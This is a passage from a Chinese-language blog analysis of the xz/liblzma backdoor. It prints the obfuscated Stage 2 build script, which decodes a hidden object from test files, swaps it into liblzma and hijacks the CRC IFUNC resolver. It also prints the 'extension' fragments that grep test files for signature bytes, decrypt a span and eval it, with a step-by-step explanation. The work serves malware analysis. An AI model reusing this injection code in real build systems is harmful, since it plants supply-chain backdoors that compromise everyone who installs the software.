</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">()&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc32_fast.c<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$R</span><span class="s2">&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$x</span><span class="s2">&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc_x86_clmul.h<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! grep -qs <span class="s2">&#34;</span><span class="nv">$C</span><span class="s2">&#34;</span> ../../libtool<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nb">echo</span> <span class="nv">$liblzma_la_LINK</span> <span class="p">|</span> grep -qs -e <span class="s2">&#34;-z,now&#34;</span> -e <span class="s2">&#34;-z -Wl,now&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">echo</span> <span class="nv">$liblzma_la_LINK</span> <span class="p">|</span> grep -qs -e <span class="s2">&#34;lazy&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">Y</span><span class="o">=</span><span class="sb">`</span>grep <span class="s2">&#34;dnl Convert it to C string syntax.&#34;</span> <span class="nv">$top_srcdir</span>/m4/gettext.m4<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$zrKcjv</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -z <span class="s2">&#34;</span><span class="nv">$Y</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">88792</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">88792</span>
</span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">xz -dc <span class="nv">$top_srcdir</span>/tests/files/<span class="nv">$p</span> <span class="p">|</span> <span class="nb">eval</span> <span class="nv">$i</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C sed <span class="s2">&#34;s/\(.\)/\1\n/g&#34;</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C awk <span class="s1">&#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &#34;%c&#34;,(v+k)%m}&#39;</span> <span class="p">|</span> xz -dc --single-stream <span class="p">|</span> <span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nb">test</span> -f liblzma_la-crc64-fast.o<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">V</span><span class="o">=</span><span class="s1">&#39;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$yosA</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> sed <span class="s2">&#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc64_fast.c <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>sed <span class="s2">&#34;/include \&#34;crc_x86_clmul.h\&#34;/a \\</span><span class="nv">$V</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>sed <span class="s2">&#34;1i # 0 \&#34;</span><span class="nv">$top_srcdir</span><span class="s2">/src/liblzma/check/crc64_fast.c\&#34;&#34;</span> 2&gt;/dev/null <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">$CC</span> <span class="nv">$DEFS</span> <span class="nv">$DEFAULT_INCLUDES</span> <span class="nv">$INCLUDES</span> <span class="nv">$liblzma_la_CPPFLAGS</span> <span class="nv">$CPPFLAGS</span> <span class="nv">$AM_CFLAGS</span> <span class="nv">$CFLAGS</span> -r liblzma_la-crc64-fast.o -x c -  <span class="nv">$P</span> -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$BPep</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> sed <span class="s2">&#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34;</span> <span class="nv">$top_srcdir</span>/src/liblzma/check/crc32_fast.c <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>sed <span class="s2">&#34;/include \&#34;crc32_arm64.h\&#34;/a \\</span><span class="nv">$V</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>sed <span class="s2">&#34;1i # 0 \&#34;</span><span class="nv">$top_srcdir</span><span class="s2">/src/liblzma/check/crc32_fast.c\&#34;&#34;</span> 2&gt;/dev/null <span class="p">|</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">$CC</span> <span class="nv">$DEFS</span> <span class="nv">$DEFAULT_INCLUDES</span> <span class="nv">$INCLUDES</span> <span class="nv">$liblzma_la_CPPFLAGS</span> <span class="nv">$CPPFLAGS</span> <span class="nv">$AM_CFLAGS</span> <span class="nv">$CFLAGS</span> -r -x c -  <span class="nv">$P</span> -o .libs/liblzma_la-crc32_fast.o<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$RgYB</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nv">$AM_V_CCLD$liblzma_la_LINK</span> -rpath <span class="nv">$libdir</span> <span class="nv">$liblzma_la_OBJECTS</span> <span class="nv">$liblzma_la_LIBADD</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> ! -f .libs/liblzma.so<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">rm -f .libs/liblzma_la-crc32-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">rm -f .libs/liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">rm -f liblzma_la-crc64-fast.o <span class="o">||</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="nv">$DHLd</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="stage-2" class="heading-element"><span>Stage 2</span>
  <a href="#stage-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Stage 2是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1"target="_blank" rel="external nofollow noopener noreferrer">fected.txt</a> 文件。这个 bash 脚本中发生了很多事情，因为这是实际编译过程修改发生的地方。</p>
<p>从混淆分析的角度来看，该脚本存在三个有趣的片段，其中两个仅出现在5.6.1版本中。</p>
<h4 id="扩展-机制" class="heading-element"><span>扩展 机制</span>
  <a href="#%e6%89%a9%e5%b1%95-%e6%9c%ba%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>片段1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;~!:_ W&#39;</span> <span class="nv">$srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$vs</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">f1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">start</span><span class="o">=</span><span class="sb">`</span>expr <span class="k">$(</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f2<span class="k">)</span> + 7<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nv">ve</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;|_!{ -&#39;</span> <span class="nv">$srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$ve</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">f2</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$ve</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f2</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="s2">&#34;x</span><span class="nv">$f2</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! -f <span class="nv">$f1</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">end</span><span class="o">=</span><span class="sb">`</span>expr <span class="k">$(</span><span class="nb">echo</span> <span class="nv">$ve</span> <span class="p">|</span> cut -d: -f2<span class="k">)</span> - <span class="nv">$start</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>cat <span class="nv">$f1</span> <span class="p">|</span> tail -c +<span class="si">${</span><span class="nv">start</span><span class="si">}</span> <span class="p">|</span> head -c +<span class="si">${</span><span class="nv">end</span><span class="si">}</span> <span class="p">|</span> tr <span class="s2">&#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34;</span> <span class="s2">&#34;\0-\377&#34;</span> <span class="p">|</span> xz -F raw --lzma2 -dc<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span></span></span></code></pre></td></tr></table>
</div>
</div><p>片段3：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">vs</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;jV!.^%&#39;</span> <span class="nv">$top_srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$vs</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">f1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">start</span><span class="o">=</span><span class="sb">`</span>expr <span class="k">$(</span><span class="nb">echo</span> <span class="nv">$vs</span> <span class="p">|</span> cut -d: -f2<span class="k">)</span> + 7<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nv">ve</span><span class="o">=</span><span class="sb">`</span>grep -broaF <span class="s1">&#39;%.R.1Z&#39;</span> <span class="nv">$top_srcdir</span>/tests/files/ 2&gt;/dev/null<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$ve</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nv">f2</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$ve</span> <span class="p">|</span> cut -d: -f1<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$f2</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;x&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="s2">&#34;x</span><span class="nv">$f2</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;x</span><span class="nv">$f1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! -f <span class="nv">$f1</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">end</span><span class="o">=</span><span class="sb">`</span>expr <span class="k">$(</span><span class="nb">echo</span> <span class="nv">$ve</span> <span class="p">|</span> cut -d: -f2<span class="k">)</span> - <span class="nv">$start</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>cat <span class="nv">$f1</span> <span class="p">|</span> tail -c +<span class="si">${</span><span class="nv">start</span><span class="si">}</span> <span class="p">|</span> head -c +<span class="si">${</span><span class="nv">end</span><span class="si">}</span> <span class="p">|</span> tr <span class="s2">&#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34;</span> <span class="s2">&#34;\0-\377&#34;</span> <span class="p">|</span> xz -F raw --lzma2 -dc<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这两个片段几乎相同，所以可以一起处理它们。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png?size=small" data-sub-html="<h2>image-20240407125802810</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png" alt="image-20240407125802810" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240407125802810.png?size=large 2x" data-title="image-20240407125802810" style="--width: 1408px;--aspect-ratio: 1408 / 478;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ol>
<li>
<p>首先，他们尝试在tests/files/目录中查找（grep -broaF）两个文件，其中包含以下字节（签名）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Fragment 1: <span class="s2">&#34;~!:_ W&#34;</span> and <span class="s2">&#34;|_!{ -&#34;</span>
</span></span><span class="line"><span class="cl">Fragment 3: <span class="s2">&#34;jV!.^%&#34;</span> and <span class="s2">&#34;%.R.1Z&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 注：grep 实际输出格式如下：file_name:offset:signature。例如：</span>
</span></span><span class="line"><span class="cl">$ grep -broaF <span class="s2">&#34;XYZ&#34;</span>
</span></span><span class="line"><span class="cl">testfile:9:XYZ</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end.</p>
</li>
<li>
<p>一旦脚本有了 $start 和 $end 偏移量，它就会切出文件中具有第一个签名的部分 <code>cat $f1 | tail -c +${start} | head -c +${end}</code></p>
</li>
<li>
<p>接下来先是替换密码（使用 5.6.0 版本密钥）：<code>tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;</code></p>
</li>
<li>
<p>然后解压数据以便立即执行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval `... | xz -F raw --lzma2 -dc`</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<p>事实上，在现有的5.6.0和5.6.1的TAR存档中都没发现任何带有签名的文件，看上去像是一个待使用的“扩展插件”系统，允许未来添加脚本以在该阶段的上下文中运行，而无需修改原始的负载文件。毕竟，不断地修改 bad 和 good 测试文件很可疑。</p>
<h4 id="目标选择" class="heading-element"><span>目标选择</span>
  <a href="#%e7%9b%ae%e6%a0%87%e9%80%89%e6%8b%a9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>此脚本会检查各种条件，例如计算机的体系结构。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
